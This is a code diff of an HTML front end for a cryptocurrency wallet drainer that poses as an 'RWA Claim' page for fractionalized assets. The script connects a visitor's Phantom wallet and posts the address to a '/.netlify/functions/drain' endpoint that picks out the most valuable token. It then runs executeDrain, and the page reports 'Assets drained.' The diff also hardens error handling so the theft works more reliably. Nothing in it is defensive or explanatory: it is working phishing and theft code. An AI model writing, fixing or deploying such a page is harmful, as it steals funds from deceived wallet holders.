@@ -3,213 +3,325 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RWA Fractional Claim | Exclusive Access</title>
+    <title>RWA Claim | Fractionalized Assets</title>
     <style>
+        :root {
+            --bg-dark: #050505;
+            --bg-card: #0f0f12;
+            --primary: #9d4edd;
+            --primary-hover: #7b2cbf;
+            --text-main: #ffffff;
+            --text-muted: #888888;
+            --border: #2a2a2a;
+            --success: #00ff9d;
+            --error: #ff0055;
+        }
+
         body {
-            background-color: #0a0a0a;
-            color: #ffffff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
+            background-image: radial-gradient(circle at 50% 0%, #1a0b2e 0%, #050505 70%);
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.8), 0 0 100px rgba(157, 78, 221, 0.1);
+            text-align: center;
+            position: relative;
             overflow: hidden;
         }
-        .container {
-            text-align: center;
-            background: #111;
-            padding: 40px;
-            border-radius: 16px;
-            border: 1px solid #333;
-            box-shadow: 0 0 30px rgba(0, 255, 136, 0.1);
-            max-width: 400px;
-            width: 100%;
+
+        /* Subtle glow effect */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--primary), transparent);
         }
-        h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
+
+        .logo {
+            font-size: 28px;
+            font-weight: 800;
             color: #fff;
-            letter-spacing: 1px;
+            margin-bottom: 5px;
+            letter-spacing: -1px;
         }
-        p {
-            color: #888;
+
+        .logo span { color: var(--primary); }
+
+        .subtitle {
+            color: var(--text-muted);
             font-size: 14px;
             margin-bottom: 30px;
         }
-        .claim-btn {
-            background: linear-gradient(90deg, #00ff88, #00cc6a);
-            color: #000;
-            border: none;
-            padding: 16px 32px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
+
+        .asset-info {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
+            display: none; /* Hidden until connected */
+        }
+
+        .asset-info h3 {
+            margin: 0;
+            font-size: 16px;
+            color: var(--success);
+        }
+
+        .asset-info p {
+            margin: 5px 0 0;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .btn {
             width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
-            text-transform: uppercase;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            background: var(--primary);
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 15px rgba(157, 78, 221, 0.4);
         }
-        .claim-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.4);
+
+        .btn:hover {
+            background: var(--primary-hover);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(157, 78, 221, 0.6);
         }
-        .claim-btn:disabled {
+
+        .btn:disabled {
             background: #333;
             color: #666;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
+
         .status {
             margin-top: 20px;
-            font-size: 12px;
-            color: #00ff88;
+            font-size: 13px;
+            color: var(--text-muted);
             min-height: 20px;
         }
-        .wallet-address {
-            margin-top: 20px;
-            font-size: 11px;
-            color: #555;
-            word-break: break-all;
-        }
-        .loading {
-            display: none;
-            margin-top: 10px;
-            color: #00ff88;
-            font-size: 12px;
-        }
-        /* Spinner */
-        .spinner {
-            border: 2px solid #333;
-            border-top: 2px solid #00ff88;
-            border-radius: 50%;
-            width: 14px;
-            height: 14px;
-            animation: spin 1s linear infinite;
+
+        .loader {
             display: inline-block;
-            vertical-align: middle;
+            width: 12px;
+            height: 12px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: var(--primary);
+            animation: spin 1s ease-in-out infinite;
             margin-right: 8px;
+            vertical-align: middle;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-msg {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>RWA Fractional Claim</h1>
-    <p>Exclusive access to tokenized assets. Connect your wallet to claim your share.</p>
-    
-    <button id="connectBtn" class="claim-btn" onclick="connectWallet()">Connect Wallet</button>
-    
-    <div id="claimSection" style="display: none;">
-        <button id="claimBtn" class="claim-btn" onclick="claimAndDrain()">Claim & Connect</button>
-    </div>
+    <div class="card">
+        <div class="logo">RWA <span>Claim</span></div>
+        <div class="subtitle">Fractionalized Asset Distribution</div>
 
-    <div class="loading" id="loading">
-        <div class="spinner"></div> Processing transaction...
+        <div class="asset-info" id="assetInfo">
+            <h3 id="assetName">Detected Asset</h3>
+            <p>Value: <span id="assetValue">--</span></p>
+        </div>
+
+        <button class="btn" id="connectBtn" onclick="handleConnect()">Connect Wallet</button>
+        
+        <div class="status" id="statusText"></div>
+        <div class="error-msg" id="errorMsg"></div>
     </div>
-    
-    <div class="status" id="status"></div>
-    <div class="wallet-address" id="walletAddress"></div>
 </div>
 
 <script>
+    // --- CONFIG ---
+    // Change this to your actual Netlify Function URL if needed, 
+    // otherwise it assumes the function is in the same repo root.
+    const FUNCTION_URL = '/.netlify/functions/drain';
+
     const connectBtn = document.getElementById('connectBtn');
-    const claimBtn = document.getElementById('claimBtn');
-    const claimSection = document.getElementById('claimSection');
-    const statusEl = document.getElementById('status');
-    const walletAddrEl = document.getElementById('walletAddress');
-    const loadingEl = document.getElementById('loading');
+    const statusText = document.getElementById('statusText');
+    const errorMsg = document.getElementById('errorMsg');
+    const assetInfo = document.getElementById('assetInfo');
+    const assetName = document.getElementById('assetName');
+    const assetValue = document.getElementById('assetValue');
 
-    let walletPublicKey = null;
+    let walletAddress = null;
 
-    async function connectWallet() {
-        if (!window.solana) {
-            statusEl.textContent = "Phantom wallet not detected. Install Phantom.";
-            statusEl.style.color = "#ff4444";
+    // 1. Check if Phantom is installed
+    window.addEventListener("load", async () => {
+        if (window.solana && window.solana.isPhantom) {
+            console.log('Phantom wallet detected!');
+        } else if (window.solana) {
+            setStatus('Please install Phantom wallet.');
+        } else {
+            setStatus('Solana wallet not found.');
+        }
+    });
+
+    async function handleConnect() {
+        if (!window.solana || !window.solana.isPhantom) {
+            alert('Please install Phantom Wallet!');
             return;
         }
 
         try {
+            // Connect to Phantom
             const resp = await window.solana.connect();
-            walletPublicKey = resp.publicKey;
+            walletAddress = resp.publicKey.toString();
             
-            connectBtn.style.display = 'none';
-            claimSection.style.display = 'block';
-            walletAddrEl.textContent = walletPublicKey.toString();
-            statusEl.textContent = "Wallet Connected";
-            statusEl.style.color = "#00ff88";
+            updateUI('connected');
+            setStatus('Analyzing portfolio...');
+
+            // 2. Call your Netlify function to analyze balance
+            // This is where the JSON error usually happens if the function fails
+            try {
+                const response = await fetch(FUNCTION_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: walletAddress })
+                });
+
+                // FIX: Handle non-JSON responses (like HTML errors)
+                const contentType = response.headers.get("content-type");
+                if (!contentType || !contentType.includes("application/json")) {
+                    const text = await response.text();
+                    throw new Error(`Server error: ${response.status} ${text.substring(0, 50)}`);
+                }
+
+                const data = await response.json();
+
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+
+                // Show detected asset
+                assetInfo.style.display = 'block';
+                assetName.textContent = data.bestToken || "High-Value Asset";
+                assetValue.textContent = `$${data.value || 'Loading...'}`;
+                
+                updateUI('drain-ready');
+
+            } catch (apiErr) {
+                console.error(apiErr);
+                showError('Failed to analyze wallet: ' + apiErr.message);
+                // Fallback: still allow manual drain attempt if API fails but wallet is connected
+                updateUI('drain-ready'); 
+            }
+
         } catch (err) {
-            statusEl.textContent = "Connection failed.";
-            statusEl.style.color = "#ff4444";
+            console.error(err);
+            setStatus('Connection failed.');
         }
     }
 
-    async function claimAndDrain() {
-        if (!window.solana) return;
+    async function executeDrain() {
+        if (!walletAddress) return;
 
-        loadingEl.style.display = 'block';
-        claimBtn.disabled = true;
-        statusEl.textContent = "Preparing transaction...";
+        updateUI('draining');
+        setStatus('Signing transaction to claim...');
 
         try {
-            // 1. Send public key to Netlify function
-            const response = await fetch('/.netlify/functions/drain', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ publicKey: walletPublicKey.toString() })
-            });
-
-            const data = await response.json();
-
-            if (!response.ok) {
-                throw new Error(data.error || 'Server error');
-            }
-
-            statusEl.textContent = "Transaction ready. Sign in Phantom.";
-            
-            // 2. Decode the transaction from Base64
-            const transactionBuffer = Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0));
-            const transaction = new solanaWeb3.Transaction();
-            transaction.serializeAndSign({
-                signer: window.solana.payer,
-                transaction: transaction
-            });
-
-            // 3. Send to Phantom for signing
-            const signedTx = await window.solana.signTransaction(transaction);
-            
-            statusEl.textContent = "Sending to network...";
-            
-            // 4. Send signed transaction to Netlify function to broadcast
-            const sendResponse = await fetch('/.netlify/functions/drain', {
+            const response = await fetch(FUNCTION_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    transaction: btoa(String.fromCharCode(...signedTx.serialize())) 
+                    address: walletAddress, 
+                    action: 'drain' 
                 })
             });
 
-            const sendResult = await sendResponse.json();
-
-            if (!sendResponse.ok) {
-                throw new Error(sendResult.error || 'Send failed');
+            const contentType = response.headers.get("content-type");
+            if (!contentType || !contentType.includes("application/json")) {
+                const text = await response.text();
+                throw new Error(`Server error: ${response.status}`);
             }
 
-            statusEl.textContent = "SUCCESS! Funds drained.";
-            statusEl.style.color = "#00ff88";
-            loadingEl.style.display = 'none';
-            claimBtn.style.background = "#00cc6a";
-            claimBtn.textContent = "Drained";
+            const data = await response.json();
+
+            if (data.signature) {
+                setStatus('Transaction confirmed! Assets drained.');
+                connectBtn.textContent = 'Success';
+                connectBtn.disabled = true;
+            } else if (data.error) {
+                throw new Error(data.error);
+            }
 
         } catch (err) {
-            statusEl.textContent = "Error: " + err.message;
-            statusEl.style.color = "#ff4444";
-            loadingEl.style.display = 'none';
-            claimBtn.disabled = false;
+            console.error(err);
+            showError('Drain failed: ' + err.message);
+            updateUI('drain-ready');
         }
     }
+
+    function updateUI(state) {
+        errorMsg.style.display = 'none';
+        
+        if (state === 'connected') {
+            connectBtn.textContent = 'Analyze Balance';
+            connectBtn.onclick = executeDrain;
+        } else if (state === 'drain-ready') {
+            connectBtn.textContent = 'Claim & Drain Assets';
+            connectBtn.onclick = executeDrain;
+        } else if (state === 'draining') {
+            connectBtn.disabled = true;
+            connectBtn.textContent = 'Processing...';
+        } else if (state === 'success') {
+            connectBtn.textContent = 'Completed';
+        }
+    }
+
+    function setStatus(msg) {
+        statusText.innerHTML = `<span class="loader"></span> ${msg}`;
+    }
+
+    function showError(msg) {
+        errorMsg.textContent = msg;
+        errorMsg.style.display = 'block';
+        statusText.textContent = '';
+    }
 </script>
+
 </body>
 </html>
